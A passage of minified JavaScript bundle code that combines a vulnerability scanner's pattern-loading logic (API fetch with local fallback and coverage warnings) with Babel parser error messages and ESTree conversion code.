SUCCESS",{source:Y?"cache":"api",language:X,patternCount:Q.length,coverageLevel:Q.length>=25?"full":"partial",cached:Y}),Q}catch(J){throw U.error(`❌ ApiPatternSource: Failed to fetch ${X} patterns`,J),U.error("PATTERN FETCH FAILURE",{source:"api",language:X,error:J instanceof Error?J.message:String(J),impact:"Will fall back to minimal patterns if hybrid mode"}),J}}async getPatternsByType(X){let Q=(await this.getAllPatterns()).filter((Y)=>Y.type===X);return U.info(`ApiPatternSource: Returning ${Q.length} patterns of type ${X}`),Q}async getAllPatterns(){let X=[],J=0,Q=0;for(let Y of this.supportedLanguages)try{let W=await this.client.fetchPatterns(Y);if(X.push(...W.patterns),W.fromCache)J++;else Q++}catch(W){U.warn(`Failed to fetch ${Y} patterns, continuing...`,W)}if(X.length===0){let Y=Error("Failed to fetch patterns for all languages from API");throw U.error("ApiPatternSource: No patterns retrieved from any language",Y),Y}return U.info(`ApiPatternSource: Retrieved ${X.length} total patterns (${J} from cache, ${Q} from API)`),X}}class A2{apiSource;localSource;constructor(X,J){this.apiSource=new R2(X,J),this.localSource=new m9}async getPatternsByLanguage(X){try{return await this.apiSource.getPatternsByLanguage(X)}catch(J){return U.warn(`Falling back to local patterns for ${X} due to API error`,J),await this.localSource.getPatternsByLanguage(X)}}async getPatternsByType(X){try{return await this.apiSource.getPatternsByType(X)}catch(J){return U.warn(`Falling back to local patterns for type ${X} due to API error`,J),await this.localSource.getPatternsByType(X)}}async getAllPatterns(){try{return await this.apiSource.getAllPatterns()}catch(X){return U.warn("Falling back to local patterns due to API error",X),await this.localSource.getAllPatterns()}}}function C6(){let X=process.env.RSOLV_API_KEY,J=process.env.RSOLV_API_URL,Q=process.env.USE_LOCAL_PATTERNS==="true",Y=process.env.USE_FAIL_ON_MINIMAL_PATTERNS==="true";if(Q){if(U.error("\uD83D\uDEA8 FORCED LOCAL PATTERNS",{reason:"USE_LOCAL_PATTERNS=true",impact:"Using minimal patterns instead of API patterns",recommendation:"Remove USE_LOCAL_PATTERNS environment variable"}),Y)throw Error("Cannot proceed with minimal patterns when USE_FAIL_ON_MINIMAL_PATTERNS is set. Either provide RSOLV_API_KEY or unset USE_FAIL_ON_MINIMAL_PATTERNS.");return U.info("Using local pattern source (USE_LOCAL_PATTERNS=true)"),new m9}if(X)return U.info("✅ Using hybrid pattern source with API key"),U.info("PATTERN SOURCE SUCCESS",{source:"api",mode:"hybrid",fallbackAvailable:!0,apiKeyLength:X.length,apiKeyPrefix:X.substring(0,10)+"..."}),new A2(X,J);if(U.error("\uD83D\uDEA8 CRITICAL CONFIGURATION ERROR",{problem:"No RSOLV_API_KEY provided",impact:"Scanner will use minimal patterns and miss most vulnerabilities",detectionRate:"Approximately 10-20% of vulnerabilities will be detected",recommendation:"Set RSOLV_API_KEY environment variable or rsolvApiKey in workflow"}),Y)throw Error("Cannot proceed with minimal patterns when USE_FAIL_ON_MINIMAL_PATTERNS is set. Provide RSOLV_API_KEY to use API patterns.");return U.warn("No API key provided, using local pattern source only"),new m9}var m9;var k8=s(()=>{F2();N$();I1();m9=class m9{patterns=[];static MINIMUM_PATTERNS_PER_LANGUAGE=25;static CRITICAL_PATTERN_TYPES=["sql_injection","command_injection","xss","path_traversal","insecure_deserialization"];constructor(){this.initializePatterns()}initializePatterns(){if(this.patterns=T5(),!process.env.RSOLV_API_KEY)U.error("\uD83D\uDEA8 CRITICAL: Using minimal patterns only",{reason:"No RSOLV_API_KEY provided",patternCount:this.patterns.length,impact:"Detection capability severely limited - will miss most vulnerabilities",recommendation:"Set RSOLV_API_KEY environment variable"}),U.warn("Using minimal fallback patterns - API connection recommended for full pattern coverage");else U.debug("LocalPatternSource initialized as fallback",{patternCount:this.patterns.length,mode:"fallback"});this.validateCriticalPatternCoverage()}validateCriticalPatternCoverage(){let X=new Set(this.patterns.map((Q)=>Q.type)),J=m9.CRITICAL_PATTERN_TYPES.filter((Q)=>!X.has(Q));if(J.length>0)U.error("\uD83D\uDEA8 MISSING CRITICAL PATTERN TYPES",{missing:J,impact:"Cannot detect these vulnerability types"})}async getPatternsByLanguage(X){let J=w$(X),Q=Math.round(J.length/m9.MINIMUM_PATTERNS_PER_LANGUAGE*100);if(U.warn("\uD83D\uDCCA PATTERN SOURCE METRICS",{source:"local",language:X,patternCount:J.length,expectedMinimum:m9.MINIMUM_PATTERNS_PER_LANGUAGE,coveragePercentage:`${Q}%`}),J.length<m9.MINIMUM_PATTERNS_PER_LANGUAGE)U.error(`\uD83D\uDEA8 INSUFFICIENT PATTERNS for ${X}`,{language:X,actual:J.length,required:m9.MINIMUM_PATTERNS_PER_LANGUAGE,deficit:m9.MINIMUM_PATTERNS_PER_LANGUAGE-J.length});return U.info(`LocalPatternSource: Returning ${J.length} minimal ${X} patterns`),J}async getPatternsByType(X){let J=this.patterns.filter((Q)=>Q.type===X);return U.info(`LocalPatternSource: Returning ${J.length} minimal patterns of type ${X}`),J}async getAllPatterns(){return U.info(`LocalPatternSource: Returning ${this.patterns.length} minimal patterns total`),this.patterns}}});var y5=v((jV)=>{Object.defineProperty(jV,"__esModule",{value:!0});function UP(X,J){if(X==null)return{};var Q={};for(var Y in X)if({}.hasOwnProperty.call(X,Y)){if(J.indexOf(Y)!==-1)continue;Q[Y]=X[Y]}return Q}class E6{constructor(X,J,Q){this.line=void 0,this.column=void 0,this.index=void 0,this.line=X,this.column=J,this.index=Q}}class dJ{constructor(X,J){this.start=void 0,this.end=void 0,this.filename=void 0,this.identifierName=void 0,this.start=X,this.end=J}}function a0(X,J){let{line:Q,column:Y,index:W}=X;return new E6(Q,Y+J,W+J)}var L$="BABEL_PARSER_SOURCETYPE_MODULE_REQUIRED",ZP={ImportMetaOutsideModule:{message:`import.meta may appear only with 'sourceType: "module"'`,code:L$},ImportOutsideModule:{message:`'import' and 'export' may appear only with 'sourceType: "module"'`,code:L$}},I$={ArrayPattern:"array destructuring pattern",AssignmentExpression:"assignment expression",AssignmentPattern:"assignment expression",ArrowFunctionExpression:"arrow function expression",ConditionalExpression:"conditional expression",CatchClause:"catch clause",ForOfStatement:"for-of statement",ForInStatement:"for-in statement",ForStatement:"for-loop",FormalParameters:"function parameter list",Identifier:"identifier",ImportSpecifier:"import specifier",ImportDefaultSpecifier:"import default specifier",ImportNamespaceSpecifier:"import namespace specifier",ObjectPattern:"object destructuring pattern",ParenthesizedExpression:"parenthesized expression",RestElement:"rest element",UpdateExpression:{true:"prefix operation",false:"postfix operation"},VariableDeclarator:"variable declaration",YieldExpression:"yield expression"},k5=(X)=>X.type==="UpdateExpression"?I$.UpdateExpression[`${X.prefix}`]:I$[X.type],qP={AccessorIsGenerator:({kind:X})=>`A ${X}ter cannot be a generator.`,ArgumentsInClass:"'arguments' is only allowed in functions and class methods.",AsyncFunctionInSingleStatementContext:"Async functions can only be declared at the top level or inside a block.",AwaitBindingIdentifier:"Can not use 'await' as identifier inside an async function.",AwaitBindingIdentifierInStaticBlock:"Can not use 'await' as identifier inside a static block.",AwaitExpressionFormalParameter:"'await' is not allowed in async function parameters.",AwaitUsingNotInAsyncContext:"'await using' is only allowed within async functions and at the top levels of modules.",AwaitNotInAsyncContext:"'await' is only allowed within async functions and at the top levels of modules.",BadGetterArity:"A 'get' accessor must not have any formal parameters.",BadSetterArity:"A 'set' accessor must have exactly one formal parameter.",BadSetterRestParameter:"A 'set' accessor function argument must not be a rest parameter.",ConstructorClassField:"Classes may not have a field named 'constructor'.",ConstructorClassPrivateField:"Classes may not have a private field named '#constructor'.",ConstructorIsAccessor:"Class constructor may not be an accessor.",ConstructorIsAsync:"Constructor can't be an async function.",ConstructorIsGenerator:"Constructor can't be a generator.",DeclarationMissingInitializer:({kind:X})=>`Missing initializer in ${X} declaration.`,DecoratorArgumentsOutsideParentheses:"Decorator arguments must be moved inside parentheses: use '@(decorator(args))' instead of '@(decorator)(args)'.",DecoratorBeforeExport:"Decorators must be placed *before* the 'export' keyword. Remove the 'decoratorsBeforeExport: true' option to use the 'export @decorator class {}' syntax.",DecoratorsBeforeAfterExport:"Decorators can be placed *either* before or after the 'export' keyword, but not in both locations at the same time.",DecoratorConstructor:"Decorators can't be used with a constructor. Did you mean '@dec class { ... }'?",DecoratorExportClass:"Decorators must be placed *after* the 'export' keyword. Remove the 'decoratorsBeforeExport: false' option to use the '@decorator export class {}' syntax.",DecoratorSemicolon:"Decorators must not be followed by a semicolon.",DecoratorStaticBlock:"Decorators can't be used with a static block.",DeferImportRequiresNamespace:'Only `import defer * as x from "./module"` is valid.',DeletePrivateField:"Deleting a private field is not allowed.",DestructureNamedImport:"ES2015 named imports do not destructure. Use another statement for destructuring after the import.",DuplicateConstructor:"Duplicate constructor in the same class.",DuplicateDefaultExport:"Only one default export allowed per module.",DuplicateExport:({exportName:X})=>`\`${X}\` has already been exported. Exported identifiers must be unique.`,DuplicateProto:"Redefinition of __proto__ property.",DuplicateRegExpFlags:"Duplicate regular expression flag.",ElementAfterRest:"Rest element must be last element.",EscapedCharNotAnIdentifier:"Invalid Unicode escape.",ExportBindingIsString:({localName:X,exportName:J})=>`A string literal cannot be used as an exported binding without \`from\`.
- Did you mean \`export { '${X}' as '${J}' } from 'some-module'\`?`,ExportDefaultFromAsIdentifier:"'from' is not allowed as an identifier after 'export default'.",ForInOfLoopInitializer:({type:X})=>`'${X==="ForInStatement"?"for-in":"for-of"}' loop variable declaration may not have an initializer.`,ForInUsing:"For-in loop may not start with 'using' declaration.",ForOfAsync:"The left-hand side of a for-of loop may not be 'async'.",ForOfLet:"The left-hand side of a for-of loop may not start with 'let'.",GeneratorInSingleStatementContext:"Generators can only be declared at the top level or inside a block.",IllegalBreakContinue:({type:X})=>`Unsyntactic ${X==="BreakStatement"?"break":"continue"}.`,IllegalLanguageModeDirective:"Illegal 'use strict' directive in function with non-simple parameter list.",IllegalReturn:"'return' outside of function.",ImportAttributesUseAssert:"The `assert` keyword in import attributes is deprecated and it has been replaced by the `with` keyword. You can enable the `deprecatedImportAssert` parser plugin to suppress this error.",ImportBindingIsString:({importName:X})=>`A string literal cannot be used as an imported binding.
- Did you mean \`import { "${X}" as foo }\`?`,ImportCallArity:"`import()` requires exactly one or two arguments.",ImportCallNotNewExpression:"Cannot use new with import(...).",ImportCallSpreadArgument:"`...` is not allowed in `import()`.",ImportJSONBindingNotDefault:"A JSON module can only be imported with `default`.",ImportReflectionHasAssertion:"`import module x` cannot have assertions.",ImportReflectionNotBinding:'Only `import module x from "./module"` is valid.',IncompatibleRegExpUVFlags:"The 'u' and 'v' regular expression flags cannot be enabled at the same time.",InvalidBigIntLiteral:"Invalid BigIntLiteral.",InvalidCodePoint:"Code point out of bounds.",InvalidCoverDiscardElement:"'void' must be followed by an expression when not used in a binding position.",InvalidCoverInitializedName:"Invalid shorthand property initializer.",InvalidDecimal:"Invalid decimal.",InvalidDigit:({radix:X})=>`Expected number in radix ${X}.`,InvalidEscapeSequence:"Bad character escape sequence.",InvalidEscapeSequenceTemplate:"Invalid escape sequence in template.",InvalidEscapedReservedWord:({reservedWord:X})=>`Escape sequence in keyword ${X}.`,InvalidIdentifier:({identifierName:X})=>`Invalid identifier ${X}.`,InvalidLhs:({ancestor:X})=>`Invalid left-hand side in ${k5(X)}.`,InvalidLhsBinding:({ancestor:X})=>`Binding invalid left-hand side in ${k5(X)}.`,InvalidLhsOptionalChaining:({ancestor:X})=>`Invalid optional chaining in the left-hand side of ${k5(X)}.`,InvalidNumber:"Invalid number.",InvalidOrMissingExponent:"Floating-point numbers require a valid exponent after the 'e'.",InvalidOrUnexpectedToken:({unexpected:X})=>`Unexpected character '${X}'.`,InvalidParenthesizedAssignment:"Invalid parenthesized assignment pattern.",InvalidPrivateFieldResolution:({identifierName:X})=>`Private name #${X} is not defined.`,InvalidPropertyBindingPattern:"Binding member expression.",InvalidRecordProperty:"Only properties and spread elements are allowed in record definitions.",InvalidRestAssignmentPattern:"Invalid rest operator's argument.",LabelRedeclaration:({labelName:X})=>`Label '${X}' is already declared.`,LetInLexicalBinding:"'let' is disallowed as a lexically bound name.",LineTerminatorBeforeArrow:"No line break is allowed before '=>'.",MalformedRegExpFlags:"Invalid regular expression flag.",MissingClassName:"A class name is required.",MissingEqInAssignment:"Only '=' operator can be used for specifying default value.",MissingSemicolon:"Missing semicolon.",MissingPlugin:({missingPlugin:X})=>`This experimental syntax requires enabling the parser plugin: ${X.map((J)=>JSON.stringify(J)).join(", ")}.`,MissingOneOfPlugins:({missingPlugin:X})=>`This experimental syntax requires enabling one of the following parser plugin(s): ${X.map((J)=>JSON.stringify(J)).join(", ")}.`,MissingUnicodeEscape:"Expecting Unicode escape sequence \\uXXXX.",MixingCoalesceWithLogical:"Nullish coalescing operator(??) requires parens when mixing with logical operators.",ModuleAttributeDifferentFromType:"The only accepted module attribute is `type`.",ModuleAttributeInvalidValue:"Only string literals are allowed as module attribute values.",ModuleAttributesWithDuplicateKeys:({key:X})=>`Duplicate key "${X}" is not allowed in module attributes.`,ModuleExportNameHasLoneSurrogate:({surrogateCharCode:X})=>`An export name cannot include a lone surrogate, found '\\u${X.toString(16)}'.`,ModuleExportUndefined:({localName:X})=>`Export '${X}' is not defined.`,MultipleDefaultsInSwitch:"Multiple default clauses.",NewlineAfterThrow:"Illegal newline after throw.",NoCatchOrFinally:"Missing catch or finally clause.",NumberIdentifier:"Identifier directly after number.",NumericSeparatorInEscapeSequence:"Numeric separators are not allowed inside unicode escape sequences or hex escape sequences.",ObsoleteAwaitStar:"'await*' has been removed from the async functions proposal. Use Promise.all() instead.",OptionalChainingNoNew:"Constructors in/after an Optional Chain are not allowed.",OptionalChainingNoTemplate:"Tagged Template Literals are not allowed in optionalChain.",OverrideOnConstructor:"'override' modifier cannot appear on a constructor declaration.",ParamDupe:"Argument name clash.",PatternHasAccessor:"Object pattern can't contain getter or setter.",PatternHasMethod:"Object pattern can't contain methods.",PrivateInExpectedIn:({identifierName:X})=>`Private names are only allowed in property accesses (\`obj.#${X}\`) or in \`in\` expressions (\`#${X} in obj\`).`,PrivateNameRedeclaration:({identifierName:X})=>`Duplicate private name #${X}.`,RecordExpressionBarIncorrectEndSyntaxType:"Record expressions ending with '|}' are only allowed when the 'syntaxType' option of the 'recordAndTuple' plugin is set to 'bar'.",RecordExpressionBarIncorrectStartSyntaxType:"Record expressions starting with '{|' are only allowed when the 'syntaxType' option of the 'recordAndTuple' plugin is set to 'bar'.",RecordExpressionHashIncorrectStartSyntaxType:"Record expressions starting with '#{' are only allowed when the 'syntaxType' option of the 'recordAndTuple' plugin is set to 'hash'.",RecordNoProto:"'__proto__' is not allowed in Record expressions.",RestTrailingComma:"Unexpected trailing comma after rest element.",SloppyFunction:"In non-strict mode code, functions can only be declared at top level or inside a block.",SloppyFunctionAnnexB:"In non-strict mode code, functions can only be declared at top level, inside a block, or as the body of an if statement.",SourcePhaseImportRequiresDefault:'Only `import source x from "./module"` is valid.',StaticPrototype:"Classes may not have static property named prototype.",SuperNotAllowed:"`super()` is only valid inside a class constructor of a subclass. Maybe a typo in the method name ('constructor') or not extending another class?",SuperPrivateField:"Private fields can't be accessed on super.",TrailingDecorator:"Decorators must be attached to a class element.",TupleExpressionBarIncorrectEndSyntaxType:"Tuple expressions ending with '|]' are only allowed when the 'syntaxType' option of the 'recordAndTuple' plugin is set to 'bar'.",TupleExpressionBarIncorrectStartSyntaxType:"Tuple expressions starting with '[|' are only allowed when the 'syntaxType' option of the 'recordAndTuple' plugin is set to 'bar'.",TupleExpressionHashIncorrectStartSyntaxType:"Tuple expressions starting with '#[' are only allowed when the 'syntaxType' option of the 'recordAndTuple' plugin is set to 'hash'.",UnexpectedArgumentPlaceholder:"Unexpected argument placeholder.",UnexpectedAwaitAfterPipelineBody:'Unexpected "await" after pipeline body; await must have parentheses in minimal proposal.',UnexpectedDigitAfterHash:"Unexpected digit after hash token.",UnexpectedImportExport:"'import' and 'export' may only appear at the top level.",UnexpectedKeyword:({keyword:X})=>`Unexpected keyword '${X}'.`,UnexpectedLeadingDecorator:"Leading decorators must be attached to a class declaration.",UnexpectedLexicalDeclaration:"Lexical declaration cannot appear in a single-statement context.",UnexpectedNewTarget:"`new.target` can only be used in functions or class properties.",UnexpectedNumericSeparator:"A numeric separator is only allowed between two digits.",UnexpectedPrivateField:"Unexpected private name.",UnexpectedReservedWord:({reservedWord:X})=>`Unexpected reserved word '${X}'.`,UnexpectedSuper:"'super' is only allowed in object methods and classes.",UnexpectedToken:({expected:X,unexpected:J})=>`Unexpected token${J?` '${J}'.`:""}${X?`, expected "${X}"`:""}`,UnexpectedTokenUnaryExponentiation:"Illegal expression. Wrap left hand side or entire exponentiation in parentheses.",UnexpectedUsingDeclaration:"Using declaration cannot appear in the top level when source type is `script` or in the bare case statement.",UnexpectedVoidPattern:"Unexpected void binding.",UnsupportedBind:"Binding should be performed on object property.",UnsupportedDecoratorExport:"A decorated export must export a class declaration.",UnsupportedDefaultExport:"Only expressions, functions or classes are allowed as the `default` export.",UnsupportedImport:"`import` can only be used in `import()` or `import.meta`.",UnsupportedMetaProperty:({target:X,onlyValidPropertyName:J})=>`The only valid meta property for ${X} is ${X}.${J}.`,UnsupportedParameterDecorator:"Decorators cannot be used to decorate parameters.",UnsupportedPropertyDecorator:"Decorators cannot be used to decorate object literal properties.",UnsupportedSuper:"'super' can only be used with function calls (i.e. super()) or in property accesses (i.e. super.prop or super[prop]).",UnterminatedComment:"Unterminated comment.",UnterminatedRegExp:"Unterminated regular expression.",UnterminatedString:"Unterminated string constant.",UnterminatedTemplate:"Unterminated template.",UsingDeclarationExport:"Using declaration cannot be exported.",UsingDeclarationHasBindingPattern:"Using declaration cannot have destructuring patterns.",VarRedeclaration:({identifierName:X})=>`Identifier '${X}' has already been declared.`,VoidPatternCatchClauseParam:"A void binding can not be the catch clause parameter. Use `try { ... } catch { ... }` if you want to discard the caught error.",VoidPatternInitializer:"A void binding may not have an initializer.",YieldBindingIdentifier:"Can not use 'yield' as identifier inside a generator.",YieldInParameter:"Yield expression is not allowed in formal parameters.",YieldNotInGeneratorFunction:"'yield' is only allowed within generator functions.",ZeroDigitNumericSeparator:"Numeric separator can not be used after leading 0."},BP={StrictDelete:"Deleting local variable in strict mode.",StrictEvalArguments:({referenceName:X})=>`Assigning to '${X}' in strict mode.`,StrictEvalArgumentsBinding:({bindingName:X})=>`Binding '${X}' in strict mode.`,StrictFunction:"In strict mode code, functions can only be declared at top level or inside a block.",StrictNumericEscape:"The only valid numeric escape in strict mode is '\\0'.",StrictOctalLiteral:"Legacy octal literals are not allowed in strict mode.",StrictWith:"'with' in strict mode."},MP={ParseExpressionEmptyInput:"Unexpected parseExpression() input: The input is empty or contains only comments.",ParseExpressionExpectsEOF:({unexpected:X})=>`Unexpected parseExpression() input: The input should contain exactly one expression, but the first expression is followed by the unexpected character \`${String.fromCodePoint(X)}\`.`},jP=new Set(["ArrowFunctionExpression","AssignmentExpression","ConditionalExpression","YieldExpression"]),OP=Object.assign({PipeBodyIsTighter:"Unexpected yield after pipeline body; any yield expression acting as Hack-style pipe body must be parenthesized due to its loose operator precedence.",PipeTopicRequiresHackPipes:'Topic reference is used, but the pipelineOperator plugin was not passed a "proposal": "hack" or "smart" option.',PipeTopicUnbound:"Topic reference is unbound; it must be inside a pipe body.",PipeTopicUnconfiguredToken:({token:X})=>`Invalid topic token ${X}. In order to use ${X} as a topic reference, the pipelineOperator plugin must be configured with { "proposal": "hack", "topicToken": "${X}" }.`,PipeTopicUnused:"Hack-style pipe body does not contain a topic reference; Hack-style pipes must use topic at least once.",PipeUnparenthesizedBody:({type:X})=>`Hack-style pipe body cannot be an unparenthesized ${k5({type:X})}; please wrap it in parentheses.`},{PipelineBodyNoArrow:'Unexpected arrow "=>" after pipeline body; arrow function in pipeline body must be parenthesized.',PipelineBodySequenceExpression:"Pipeline body may not be a comma-separated sequence expression.",PipelineHeadSequenceExpression:"Pipeline head should not be a comma-separated sequence expression.",PipelineTopicUnused:"Pipeline is in topic style but does not use topic reference.",PrimaryTopicNotAllowed:"Topic reference was used in a lexical context without topic binding.",PrimaryTopicRequiresSmartPipeline:'Topic reference is used, but the pipelineOperator plugin was not passed a "proposal": "hack" or "smart" option.'}),FP=["message"];function C$(X,J,Q){Object.defineProperty(X,J,{enumerable:!1,configurable:!0,value:Q})}function RP({toMessage:X,code:J,reasonCode:Q,syntaxPlugin:Y}){let W=Q==="MissingPlugin"||Q==="MissingOneOfPlugins";{let G={AccessorCannotDeclareThisParameter:"AccesorCannotDeclareThisParameter",AccessorCannotHaveTypeParameters:"AccesorCannotHaveTypeParameters",ConstInitializerMustBeStringOrNumericLiteralOrLiteralEnumReference:"ConstInitiailizerMustBeStringOrNumericLiteralOrLiteralEnumReference",SetAccessorCannotHaveOptionalParameter:"SetAccesorCannotHaveOptionalParameter",SetAccessorCannotHaveRestParameter:"SetAccesorCannotHaveRestParameter",SetAccessorCannotHaveReturnType:"SetAccesorCannotHaveReturnType"};if(G[Q])Q=G[Q]}return function G(H,z){let $=SyntaxError();if($.code=J,$.reasonCode=Q,$.loc=H,$.pos=H.index,$.syntaxPlugin=Y,W)$.missingPlugin=z.missingPlugin;return C$($,"clone",function(K={}){var Z;let{line:q,column:B,index:M}=(Z=K.loc)!=null?Z:H;return G(new E6(q,B,M),Object.assign({},z,K.details))}),C$($,"details",z),Object.defineProperty($,"message",{configurable:!0,get(){let V=`${X(z)} (${H.line}:${H.column})`;return this.message=V,V},set(V){Object.defineProperty(this,"message",{value:V,writable:!0})}}),$}}function G6(X,J){if(Array.isArray(X))return(Y)=>G6(Y,X[0]);let Q={};for(let Y of Object.keys(X)){let W=X[Y],G=typeof W==="string"?{message:()=>W}:typeof W==="function"?{message:W}:W,{message:H}=G,z=UP(G,FP),$=typeof H==="string"?()=>H:H;Q[Y]=RP(Object.assign({code:"BABEL_PARSER_SYNTAX_ERROR",reasonCode:Y,toMessage:$},J?{syntaxPlugin:J}:{},z))}return Q}var S=Object.assign({},G6(ZP),G6(qP),G6(BP),G6(MP),G6`pipelineOperator`(OP));function AP(){return{sourceType:"script",sourceFilename:void 0,startIndex:0,startColumn:0,startLine:1,allowAwaitOutsideFunction:!1,allowReturnOutsideFunction:!1,allowNewTargetOutsideFunction:!1,allowImportExportEverywhere:!1,allowSuperOutsideMethod:!1,allowUndeclaredExports:!1,allowYieldOutsideFunction:!1,plugins:[],strictMode:null,ranges:!1,tokens:!1,createImportExpressions:!1,createParenthesizedExpressions:!1,errorRecovery:!1,attachComment:!0,annexB:!0}}function DP(X){let J=AP();if(X==null)return J;if(X.annexB!=null&&X.annexB!==!1)throw Error("The `annexB` option can only be set to `false`.");for(let Q of Object.keys(J))if(X[Q]!=null)J[Q]=X[Q];if(J.startLine===1){if(X.startIndex==null&&J.startColumn>0)J.startIndex=J.startColumn;else if(X.startColumn==null&&J.startIndex>0)J.startColumn=J.startIndex}else if(X.startColumn==null||X.startIndex==null){if(X.startIndex!=null)throw Error("With a `startLine > 1` you must also specify `startIndex` and `startColumn`.")}if(J.sourceType==="commonjs"){if(X.allowAwaitOutsideFunction!=null)throw Error("The `allowAwaitOutsideFunction` option cannot be used with `sourceType: 'commonjs'`.");if(X.allowReturnOutsideFunction!=null)throw Error("`sourceType: 'commonjs'` implies `allowReturnOutsideFunction: true`, please remove the `allowReturnOutsideFunction` option or use `sourceType: 'script'`.");if(X.allowNewTargetOutsideFunction!=null)throw Error("`sourceType: 'commonjs'` implies `allowNewTargetOutsideFunction: true`, please remove the `allowNewTargetOutsideFunction` option or use `sourceType: 'script'`.")}return J}var{defineProperty:wP}=Object,P$=(X,J)=>{if(X)wP(X,J,{enumerable:!1,value:X[J]})};function yJ(X){return P$(X.loc.start,"index"),P$(X.loc.end,"index"),X}var NP=(X)=>class extends X{parse(){let Q=yJ(super.parse());if(this.optionFlags&256)Q.tokens=Q.tokens.map(yJ);return Q}parseRegExpLiteral({pattern:Q,flags:Y}){let W=null;try{W=new RegExp(Q,Y)}catch(H){}let G=this.estreeParseLiteral(W);return G.regex={pattern:Q,flags:Y},G}parseBigIntLiteral(Q){let Y;try{Y=BigInt(Q)}catch(G){Y=null}let W=this.estreeParseLiteral(Y);return W.bigint=String(W.value||Q),W}parseDecimalLiteral(Q){let W=this.estreeParseLiteral(null);return W.decimal=String(W.value||Q),W}estreeParseLiteral(Q){return this.parseLiteral(Q,"Literal")}parseStringLiteral(Q){return this.estreeParseLiteral(Q)}parseNumericLiteral(Q){return this.estreeParseLiteral(Q)}parseNullLiteral(){return this.estreeParseLiteral(null)}parseBooleanLiteral(Q){return this.estreeParseLiteral(Q)}estreeParseChainExpression(Q,Y){let W=this.startNodeAtNode(Q);return W.expression=Q,this.finishNodeAt(W,"ChainExpression",Y)}directiveToStmt(Q){let Y=Q.value;delete Q.value,this.castNodeTo(Y,"Literal"),Y.raw=Y.extra.raw,Y.value=Y.extra.expressionValue;let W=this.castNodeTo(Q,"ExpressionStatement");return W.expression=Y,W.directive=Y.extra.rawValue,delete Y.extra,W}fillOptionalPropertiesForTSESLint(Q){}cloneEstreeStringLiteral(Q){let{start:Y,end:W,loc:G,range:H,raw:z,value:$}=Q,V=Object.create(Q.constructor.prototype);return V.type="Literal",V.start=Y,V.end=W,V.loc=G,V.range=H,V.raw=z,V.value=$,V}initFunction(Q,Y){super.initFunction(Q,Y),Q.expression=!1}checkDeclaration(Q){if(Q!=null&&this.isObjectProperty(Q))this.checkDeclaration(Q.value);else super.checkDeclaration(Q)}getObjectOrClassMethodParams(Q){return Q.value.params}isValidDirective(Q){var Y;return Q.type==="ExpressionStatement"&&Q.expression.type==="Literal"&&typeof Q.expression.value==="string"&&!((Y=Q.expression.extra)!=null&&Y.parenthesized)}parseBlockBody(Q,Y,W,G,H){super.parseBlockBody(Q,Y,W,G,H);let z=Q.directives.map(($)=>this.directiveToStmt($));Q.body=z.concat(Q.body),delete Q.directives}parsePrivateName(){let Q=super.parsePrivateName();if(!this.getPluginOption("estree","classFeatures"))return Q;return this.convertPrivateNameToPrivateIdentifier(Q)}convertPrivateNameToPrivateIdentifier(Q){let Y=super.getPrivateNameSV(Q);return Q=Q,delete Q.id,Q.name=Y,this.castNodeTo(Q,"PrivateIdentifier")}isPrivateName(Q){if(!this.getPluginOption("estree","classFeatures"))return super.isPrivateName(Q);return Q.type==="PrivateIdentifier"}getPrivateNameSV(Q){if(!this.getPluginOption("estree","classFeatures"))return super.getPrivateNameSV(Q);return Q.name}parseLiteral(Q,Y){let W=super.parseLiteral(Q,Y);return W.raw=W.extra.raw,delete W.extra,W}parseFunctionBody(Q,Y,W=!1){super.parseFunctionBody(Q,Y,W),Q.expression=Q.body.type!=="BlockStatement"}parseMethod(Q,Y,W,G,H,z,$=!1){let V=this.startNode();V.kind=Q.kind,V=super.parseMethod(V,Y,W,G,H,z,$),delete V.kind;let{typeParameters:K}=Q;if(K)delete Q.typeParameters,V.typeParameters=K,this.resetStartLocationFromNode(V,K);let Z=this.castNodeTo(V,"FunctionExpression");if(Q.value=Z,z==="ClassPrivateMethod")Q.computed=!1;if(z==="ObjectMethod"){if(Q.kind==="method")Q.kind="init";return Q.shorthand=!1,this.finishNode(Q,"Property")}else return this.finishNode(Q,"MethodDefinition")}nameIsConstructor(Q){if(Q.type==="Literal")return Q.value==="constructor";return super.nameIsConstructor(Q)}parseClassProperty(...Q){let Y=super.parseClassProperty(...Q);if(!this.getPluginOption("estree","classFeatures"))return Y;return this.castNodeTo(Y,"PropertyDefinition"),Y}parseClassPrivateProperty(...Q){let Y=super.parseClassPrivateProperty(...Q);if(!this.getPluginOption("estree","classFeatures"))return Y;return this.castNodeTo(Y,"PropertyDefinition"),Y.computed=!1,Y}parseClassAccessorProperty(Q){let Y=super.parseClassAccessorProperty(Q);if(!this.getPluginOption("estree","classFeatures"))return Y;if(Y.abstract&&this.hasPlugin("typescript"))delete Y.abstract,this.castNodeTo(Y,"TSAbstractAccessorProperty");else this.castNodeTo(Y,"AccessorProperty");return Y}parseObjectProperty(Q,Y,W,G){let H=super.parseObjectProperty(Q,Y,W,G);if(H)H.kind="init",this.castNodeTo(H,"Property");return H}finishObjectProperty(Q){return Q.kind="init",this.finishNode(Q,"Property")}isValidLVal(Q,Y,W){return Q==="Property"?"value":super.isValidLVal(Q,Y,W)}isAssignable(Q,Y){if(Q!=null&&this.isObjectProperty(Q))return this.isAssignable(Q.value,Y);return super.isAssignable(Q,Y)}toAssignable(Q,Y=!1){if(Q!=null&&this.isObjectProperty(Q)){let{key:W,value:G}=Q;if(this.isPrivateName(W))this.classScope.usePrivateName(this.getPrivateNameSV(W),W.loc.start);this.toAssignable(G,Y)}else super.toAssignable(Q,Y)}toAssignableObjectExpressionProp(Q,Y,W){if(Q.type==="Property"&&(Q.kind==="get"||Q.kind==="set"))this.raise(S.PatternHasAccessor,Q.key);else if(Q.type==="Property"&&Q.method)this.raise(S.PatternHasMethod,Q.key);else super.toAssignableObjectExpressionProp(Q,Y,W)}finishCallExpression(Q,Y){let W=super.finishCallExpression(Q,Y);if(W.callee.type==="Import"){var G;this.castNodeTo(W,"ImportExpression"),W.source=W.arguments[0],W.options=(G=W.arguments[1])!=null?G:null;{var H;W.attributes=(H=W.arguments[1])!=null?H:null}delete W.arguments,delete W.callee}else if(W.type==="OptionalCallExpression")this.castNodeTo(W,"CallExpression");else W.optional=!1;return W}toReferencedArguments(Q){if(Q.type==="ImportExpression")return;super.toReferencedArguments(Q)}parseExport(Q,Y){let 